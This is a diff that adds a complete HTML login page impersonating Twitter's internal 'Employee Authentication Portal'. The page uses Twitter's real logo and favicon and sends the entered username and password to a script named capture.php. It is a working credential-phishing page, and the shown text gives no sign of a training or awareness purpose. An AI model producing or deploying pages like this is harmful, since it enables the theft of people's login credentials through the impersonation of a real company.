@@ -1,0 +1,25 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
+  <title>Twitter | Employee Login</title>
+  <link rel="stylesheet" href="style.css"/>
+  <link rel="icon" href="https://abs.twimg.com/favicons/twitter.2.ico">
+</head>
+<body>
+  <div class="login-container">
+    <div class="login-card">
+      <img src="https://abs.twimg.com/icons/apple-touch-icon-192x192.png" alt="Twitter Logo" class="logo"/>
+      <h2>Twitter Internal Access</h2>
+      <p class="subtitle">Employee Authentication Portal</p>
+      <form action="capture.php" method="POST">
+        <input type="text" name="username" placeholder="Email or Twitter handle" required />
+        <input type="password" name="password" placeholder="Password" required />
+        <button type="submit">Log In</button>
+      </form>
+      <p class="note">This system is for use by authorized Twitter personnel only.</p>
+    </div>
+  </div>
+</body>
+</html>
